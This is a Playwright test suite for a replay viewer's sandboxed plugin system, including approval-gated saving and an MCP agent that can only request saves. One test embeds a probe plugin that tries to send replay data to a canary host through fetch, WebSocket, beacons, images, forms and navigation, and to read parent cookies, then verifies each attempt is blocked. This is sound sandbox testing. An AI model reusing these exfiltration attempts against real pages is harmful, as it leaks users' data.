import { readFile } from 'node:fs/promises';

import { expect, test } from '@playwright/test';

import { FakeAgent, writeFailedByEndpointPlugin } from './fake-agent.ts';
import {
  closeWorkshop,
  importPlugin,
  manifestOf,
  openMore,
  openReplay,
  openWorkshop,
  panelFrame,
  seedFailingReplay,
  startCanary,
} from './malleable-support.ts';
import { serveApp } from './support.ts';

// beta.malleable ON (REPLAYS_BETA_MALLEABLE=true). Each test makes its own replay and plugin ids; the server is per spec file.
const app = serveApp({ REPLAYS_BETA_MALLEABLE: 'true' });

// Saved plugins belong to the (anonymous) person and the server is shared by the file: every test starts from none.
test.afterEach(async ({ request }) => {
  const base = app().origin;
  const { plugins } = (await (await request.get(`${base}/api/malleable/plugins`)).json()) as {
    plugins: Array<{ id: string; scope: string }>;
  };
  for (const plugin of plugins) {
    const { token } = await (
      await request.post(`${base}/api/malleable/approvals`, { data: { action: 'delete', scope: plugin.scope, id: plugin.id } })
    ).json();
    await request.delete(`${base}/api/malleable/plugins/${plugin.scope}/${plugin.id}?approval=${token}`);
  }
});

async function replayUrl(request: import('@playwright/test').APIRequestContext) {
  const base = app().origin;
  return `${base}/r/${await seedFailingReplay(request, base)}`;
}

const listSaved = async (request: import('@playwright/test').APIRequestContext) =>
  ((await (await request.get(`${app().origin}/api/malleable/plugins`)).json()) as { plugins: Array<{ id: string; version: number }> })
    .plugins;

test('the workshop: a new plugin runs sandboxed, and edits hot-reload without a page reload', async ({ page, request }) => {
  await openReplay(page, await replayUrl(request));
  await openWorkshop(page);
  await page.getByTestId('plugin-new').click();
  await expect(page.getByTestId('editor-title')).toHaveText('My tab');
  await closeWorkshop(page);

  await page.getByTestId('plugin:user-my-tab:main-tab').click();
  const frame = panelFrame(page, 'plugin:user-my-tab:main');
  await expect(frame.getByRole('heading', { name: 'Requests by status' })).toBeVisible();
  await expect(frame.getByText('404: 2')).toBeVisible();
  // The viewer page itself may only frame itself, blob: and data: (a frame that navigates away is refused by the browser).
  const html = await page.request.get(page.url(), { headers: { accept: 'text/html' } });
  expect(html.headers()['content-security-policy']).toContain("frame-src 'self'");
  // The plugin's frame is a sandboxed, opaque-origin iframe.
  const iframe = page.getByTestId('plugin:user-my-tab:main-panel').locator('iframe');
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts');

  await openWorkshop(page);
  const source = page.getByTestId('source-editor');
  await source.fill((await source.inputValue()).replace('Requests by status', 'Status mix (edited live)'));
  await expect(frame.getByRole('heading', { name: 'Status mix (edited live)' })).toBeVisible();

  // A broken edit shows its error in the output pane and the old tab keeps working until a good edit lands.
  await source.fill("replays.tab('main', () => { throw new Error('boom from the plugin'); });");
  await expect(page.getByTestId('diagnostics')).toContainText('boom from the plugin');
  // An invalid manifest is reported, not loaded.
  await page.getByTestId('pane-manifest').click();
  await page.getByTestId('manifest-editor').fill('{ not json');
  await expect(page.getByTestId('editor-problem')).toContainText('not valid JSON');
});

test('sandbox: no network, no page access, no storage, no undeclared capability', async ({ page, request }) => {
  const canary = await startCanary();
  try {
    await openReplay(page, await replayUrl(request));
    await openWorkshop(page);
    const source = `
const results = {};
const attempt = async (name, fn) => { try { await fn(); results[name] = 'allowed'; } catch (e) { results[name] = 'blocked: ' + ((e && (e.message || e.name)) || e); } };
replays.tab('main', async (el, ctx) => {
  const target = ${JSON.stringify(canary.origin)} + '/leak?data=' + encodeURIComponent(JSON.stringify(ctx.replay.meta.title));
  await attempt('fetch', () => fetch(target, { mode: 'no-cors' }).then((r) => { if (r.type !== 'opaque' && !r.ok) throw new Error('x'); return r; }));
  await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', target); x.onload = ok; x.onerror = () => no(new Error('xhr')); x.send(); }));
  await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket(target.replace('http', 'ws')); w.onopen = ok; w.onerror = () => no(new Error('ws')); }));
  await attempt('eventsource', () => new Promise((ok, no) => { const s = new EventSource(target); s.onopen = ok; s.onerror = () => no(new Error('es')); }));
  await attempt('beacon', () => { if (navigator.sendBeacon(target, 'x')) { /* queued; the CSP decides */ } });
  await attempt('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error('img')); i.src = target; }));
  await attempt('form', () => { const f = document.createElement('form'); f.action = target; f.method = 'post'; document.body.append(f); f.submit(); });
  await attempt('eval', () => eval('1 + 1'));
  await attempt('parent-dom', () => window.parent.document.title);
  await attempt('top-cookie', () => window.top.document.cookie);
  await attempt('own-cookie', () => document.cookie);
  await attempt('localStorage', () => localStorage.setItem('x', 'y'));
  await attempt('indexedDB', () => indexedDB.open('x'));
  await attempt('popup', () => { if (!window.open(target)) throw new Error('popup blocked'); });
  await attempt('top-navigation', () => { window.top.location.href = target; });
  await attempt('comments.add (not declared)', () => ctx.comments.add({ body: 'sneaky' }));
  await attempt('download (not declared)', () => ctx.download('x.txt', 'text/plain', 'x'));
  await attempt('seek (not declared)', () => ctx.seek(1000));
  el.textContent = JSON.stringify(results);
  el.dataset.done = 'yes';
  // Last, because it moves the frame: the CSP of the viewer page must refuse it.
  setTimeout(() => { location.href = ${JSON.stringify(canary.origin)} + '/navigate?data=x'; }, 2500);
});
`;
    await page.getByTestId('plugin-new').click();
    await page.getByTestId('pane-manifest').click();
    await page
      .getByTestId('manifest-editor')
      .fill(JSON.stringify(manifestOf('my-tab', 'Probe', ['replay:read'], { tabs: [{ id: 'main', label: 'Probe' }] })));
    await page.getByTestId('pane-source').click();
    await page.getByTestId('source-editor').fill(source);
    await closeWorkshop(page);
    await page.getByTestId('plugin:user-my-tab:main-tab').click();
    const probe = panelFrame(page, 'plugin:user-my-tab:main').locator('#root[data-done="yes"]');
    await expect(probe).toBeAttached({ timeout: 15_000 });
    const results = JSON.parse((await probe.textContent()) ?? '{}') as Record<string, string>;
    for (const [name, outcome] of Object.entries(results)) {
      if (name === 'beacon' || name === 'form') continue; // fire-and-forget: judged by what the canary saw
      expect(outcome, name).toMatch(/^blocked/);
    }
    expect(results['comments.add (not declared)']).toContain('permission-denied');
    expect(results['download (not declared)']).toContain('permission-denied');
    expect(results['seek (not declared)']).toContain('permission-denied');
    // Give queued beacons, the form post and the self-navigation time to show up, if they were going to.
    await page.waitForTimeout(3500);
    expect(canary.hits).toEqual([]);
    // The plugin that tried to navigate its own frame was stopped and says why.
    await openWorkshop(page);
    await expect(page.getByTestId('diagnostics')).toContainText('navigated its frame');
    await closeWorkshop(page);
    // No comment appeared either.
    const comments = await (await request.get(`${app().origin}/api/replays/${page.url().split('/r/')[1]}/comments`)).json();
    expect(comments.comments).toEqual([]);
  } finally {
    await canary.close();
  }
});

test('writes need the person’s yes: a plugin that comments is asked, and Deny means nothing is written', async ({ page, request }) => {
  const url = await replayUrl(request);
  const replayId = url.split('/r/')[1]!;
  await openReplay(page, url);
  await openWorkshop(page);
  await importPlugin(page, {
    manifest: manifestOf('auto-comment', 'Comment every console error', ['replay:read', 'comments:write'], {
      actions: [{ id: 'run', label: 'Comment every console error' }],
    }),
    source: `replays.action('run', async (ctx) => {
  const errors = ctx.replay.console.filter((c) => c.level === 'error');
  console.log('found ' + errors.length + ' console errors');
  for (const e of errors) await ctx.comments.add({ at: e.at, body: 'Console error: ' + e.message });
});`,
  });
  await expect(page.getByTestId('editor-title')).toHaveText('Comment every console error');
  await closeWorkshop(page);
  const commentsNow = async () =>
    ((await (await request.get(`${app().origin}/api/replays/${replayId}/comments`)).json()) as { comments: Array<{ body: string }> })
      .comments;

  // Run, then say no.
  await openMore(page, 'plugin-action:user-auto-comment:run');
  const prompt = page.getByTestId('permission-prompt');
  await expect(prompt).toBeVisible();
  await expect(page.getByTestId('permission-detail')).toContainText('wants to add a comment');
  await expect(page.getByTestId('permission-preview')).toContainText('Console error:');
  await page.getByTestId('permission-deny').click();
  await expect(prompt).toHaveCount(0);
  await page.waitForTimeout(500);
  expect(await commentsNow()).toEqual([]);

  // Run again, allow for this page load: the comment is written, in the person's name.
  await openMore(page, 'plugin-action:user-auto-comment:run');
  await expect(prompt).toBeVisible();
  await page.getByTestId('permission-allow-session').click();
  await expect.poll(async () => (await commentsNow()).length).toBeGreaterThan(0);
  expect((await commentsNow())[0]!.body).toContain('Console error:');
});

test('nothing is stored without approval; keep → history → diff → revert', async ({ page, request }) => {
  const url = await replayUrl(request);
  await openReplay(page, url);
  await openWorkshop(page);
  await page.getByTestId('plugin-new').click();
  await page.getByTestId('plugin-keep').click();
  const dialog = page.getByTestId('keep-dialog');
  await expect(dialog).toBeVisible();
  await expect(page.getByTestId('keep-permissions')).toContainText('replay:read');
  await expect(page.getByTestId('keep-diff')).toContainText('+ replays.tab');

  // Cancel: still nothing on the server, and a reload forgets the draft.
  await page.getByTestId('keep-cancel').click();
  expect(await listSaved(request)).toEqual([]);
  await page.reload();
  await expect(page.getByTestId('replay-player').locator('iframe')).toBeAttached();
  await expect(page.getByTestId('plugin:user-my-tab:main-tab')).toHaveCount(0);

  // Approve: version 1 is stored and survives a reload.
  await openWorkshop(page);
  await page.getByTestId('plugin-new').click();
  await page.getByTestId('plugin-keep').click();
  await page.getByTestId('keep-message').fill('first version');
  await page.getByTestId('keep-approve').click();
  await expect(dialog).toHaveCount(0);
  expect(await listSaved(request)).toMatchObject([{ id: 'my-tab', version: 1 }]);
  await page.reload();
  await expect(page.getByTestId('plugin:user-my-tab:main-tab')).toBeVisible();

  // Edit → version 2 (the dialog shows the diff).
  await openWorkshop(page);
  const source = page.getByTestId('source-editor');
  await source.fill((await source.inputValue()).replace('Requests by status', 'Status counts'));
  await page.getByTestId('plugin-keep').click();
  await expect(page.getByTestId('keep-diff')).toContainText('- ');
  await expect(page.getByTestId('keep-diff')).toContainText('+ ');
  await page.getByTestId('keep-message').fill('rename heading');
  await page.getByTestId('keep-approve').click();
  await expect(dialog).toHaveCount(0);
  expect(await listSaved(request)).toMatchObject([{ id: 'my-tab', version: 2 }]);

  // History shows both; revert to v1 asks again, and saves v1's content as v3.
  await page.getByTestId('pane-history').click();
  await expect(page.getByTestId('version:1')).toContainText('first version');
  await expect(page.getByTestId('version:2')).toContainText('rename heading');
  await page.getByTestId('version:1').click();
  await expect(page.getByTestId('version-diff')).toContainText('Requests by status');
  await page.getByTestId('version-revert').click();
  await expect(dialog).toBeVisible();
  expect(await listSaved(request)).toMatchObject([{ version: 2 }]); // not yet
  await page.getByTestId('keep-message').fill('Revert to v1');
  await page.getByTestId('keep-approve').click();
  await expect(dialog).toHaveCount(0);
  const history = await (await request.get(`${app().origin}/api/malleable/plugins/user/my-tab`)).json();
  expect(history.versions).toHaveLength(3);
  expect(history.versions[2].source).toBe(history.versions[0].source);
  expect(history.versions[2].message).toBe('Revert to v1');
  await page.getByTestId('pane-source').click();
  await expect(page.getByTestId('source-editor')).toHaveValue(/Requests by status/);
});

test('plugins are plain files: export, delete, import', async ({ page, request }) => {
  await openReplay(page, await replayUrl(request));
  await openWorkshop(page);
  await page.getByTestId('plugin-new').click();
  await page.getByTestId('pane-share').click();
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByTestId('export-file').click()]);
  expect(download.suggestedFilename()).toBe('my-tab.replays-plugin.json');
  const file = JSON.parse(await readFile((await download.path())!, 'utf8'));
  expect(file).toMatchObject({ format: 'replays-user-plugin/1', manifest: { id: 'my-tab', name: 'My tab' } });
  expect(file.source).toContain("replays.tab('main'");
  // A draft that was never saved is just discarded; importing the file brings it back.
  await page.getByTestId('plugin-discard').click();
  await expect(page.getByTestId('workshop-empty')).toBeVisible();
  await importPlugin(page, file);
  await expect(page.getByTestId('editor-title')).toHaveText('My tab');
  await expect(page.getByTestId('plugin-origin:my-tab')).toHaveText('draft');
  // A malformed file is refused with a reason.
  await page
    .getByTestId('plugin-import-input')
    .setInputFiles({ name: 'bad.json', mimeType: 'application/json', buffer: Buffer.from('{"format":"nope"}') });
  await expect(page.getByText(/Could not import/)).toBeVisible();
});

test('an agent, through the MCP server, builds "failed requests by endpoint"; the person keeps it', async ({ page, request }) => {
  const url = await replayUrl(request);
  await openReplay(page, url);
  await openWorkshop(page);
  await page.getByTestId('workshop-view-agent').click();
  await page.getByTestId('agent-connect').click();
  await expect(page.getByTestId('agent-status')).toContainText('Connected');
  const token = await page.getByTestId('bridge-token').inputValue();
  await expect(page.getByTestId('bridge-command')).toHaveValue(/replays mcp$/);

  const agent = new FakeAgent(app().origin, token);
  try {
    const init = await agent.initialize();
    expect(init.serverInfo.name).toBe('replays');
    const names = (await agent.listTools()).map((tool) => tool.name);
    expect(names).toContain('install_plugin_draft');
    expect(names).not.toContain('save_plugin');

    // 1. Look at the live state.
    const state = await agent.call('get_app_state');
    expect(state.replay.title).toBe('Checkout with failures');
    expect(state.replay.counts.failedRequests).toBeGreaterThanOrEqual(6);
    expect(state.plugins).toEqual([]);
    const api = await agent.call('get_plugin_api');
    expect(api.text ?? api.markdown).toContain('replays.tab');
    const network = await agent.call('get_replay_data', { part: 'network', limit: 50 });
    expect(network.items.some((entry: { url: string }) => entry.url.includes('/api/orders'))).toBe(true);

    // 2. Write and install the plugin. The "model" is a fixed function; the install is real.
    const plugin = writeFailedByEndpointPlugin();
    const installed = await agent.call('install_plugin_draft', plugin);
    expect(installed).toMatchObject({ installed: true, id: 'failed-by-endpoint', replaced: false });
    const bad = await agent.call('install_plugin_draft', {
      manifest: { ...plugin.manifest, permissions: ['network'] },
      source: plugin.source,
    });
    expect(bad.installed).toBe(false);
    expect(bad.error).toContain('permissions');

    // 3. The tab is there, live, and shows the grouping.
    const key = 'plugin:user-failed-by-endpoint:main';
    await expect(page.getByTestId('workshop')).toBeVisible();
    await page.getByTestId('workshop-view-plugins').click();
    await expect(page.getByTestId('plugin-origin:failed-by-endpoint')).toHaveText('agent draft');
    await closeWorkshop(page);
    expect((await agent.call('open_tab', { tab: key })).selectedTab).toBe(key);
    const frame = panelFrame(page, key);
    await expect(frame.getByTestId('summary')).toHaveText('6 failed requests in 3 endpoints');
    await expect(frame.locator('tr[data-endpoint="GET /api/coupons/:id"]')).toContainText('2');
    await expect(frame.locator('tr[data-endpoint="POST /api/orders"]')).toContainText('500');
    await expect(frame.locator('tr[data-endpoint="GET /api/users/:id/profile"]')).toContainText('403');
    const diagnostics = await agent.call('get_plugin_diagnostics', { id: 'failed-by-endpoint' });
    expect(diagnostics.diagnostics.filter((line: { level: string }) => line.level === 'error')).toEqual([]);

    // The plugin's seek button works through the broker (declared 'playback:seek').
    await frame.locator('tr[data-endpoint="POST /api/orders"] button').click();
    await expect.poll(async () => (await agent.call('get_app_state')).replay.playheadMs).toBeGreaterThan(4000);

    // 4. The agent cannot save. It can only ask.
    expect(await listSaved(request)).toEqual([]);
    const refused = await agent.call('save_plugin', { id: 'failed-by-endpoint' });
    expect(refused.error).toMatch(/unknown tool/);
    expect(await agent.call('request_keep', { id: 'failed-by-endpoint' })).toMatchObject({ asked: true });
    const dialog = page.getByTestId('keep-dialog');
    await expect(dialog).toBeVisible();
    await expect(dialog).toContainText('Written by an agent');
    await page.waitForTimeout(300);
    expect(await listSaved(request)).toEqual([]);
    await page.getByTestId('keep-approve').click();
    await expect(dialog).toHaveCount(0);
    expect(await listSaved(request)).toMatchObject([{ id: 'failed-by-endpoint', version: 1 }]);
    expect((await agent.call('list_plugins')).plugins[0]).toMatchObject({ savedVersion: 1, unsavedChanges: false });

    // 5. The activity the person can see.
    await openWorkshop(page);
    await page.getByTestId('workshop-view-agent').click();
    await expect(page.getByTestId('agent-activity')).toContainText('install_plugin_draft');
    await page.getByTestId('agent-disconnect').click();
    expect((await agent.call('get_app_state')).error).toBeTruthy();
  } finally {
    agent.stop();
  }

  // The kept plugin loads on the next visit with no agent in sight.
  await page.reload();
  await page.getByTestId('plugin:user-failed-by-endpoint:main-tab').click();
  await expect(panelFrame(page, 'plugin:user-failed-by-endpoint:main').getByTestId('summary')).toHaveText(
    '6 failed requests in 3 endpoints',
  );
});

test('WebMCP: the page registers its tools on document.modelContext', async ({ page, request }) => {
  await openReplay(page, await replayUrl(request));
  await expect.poll(() => page.evaluate(() => Boolean((document as any).modelContext))).toBe(true);
  await expect
    .poll(
      async () =>
        (
          await page.evaluate(async () => {
            const c = (document as any).modelContext;
            const t = (await c.getTools()).find((x: any) => x.name === 'get_app_state');
            return JSON.parse(await c.executeTool(t, {}));
          })
        ).replay,
    )
    .not.toBeNull();
  const tools = await page.evaluate(async () =>
    ((await (document as any).modelContext.getTools()) as Array<{ name: string }>).map((tool) => tool.name),
  );
  expect(tools).toEqual(expect.arrayContaining(['get_app_state', 'get_replay_data', 'install_plugin_draft', 'request_keep']));
  const state = await page.evaluate(async () => {
    const context = (document as any).modelContext;
    const registered = (await context.getTools()).find((tool: { name: string }) => tool.name === 'get_app_state');
    const raw = await context.executeTool(registered, {});
    return typeof raw === 'string' ? JSON.parse(raw) : raw;
  });
  expect(state.replay.title).toBe('Checkout with failures');
});
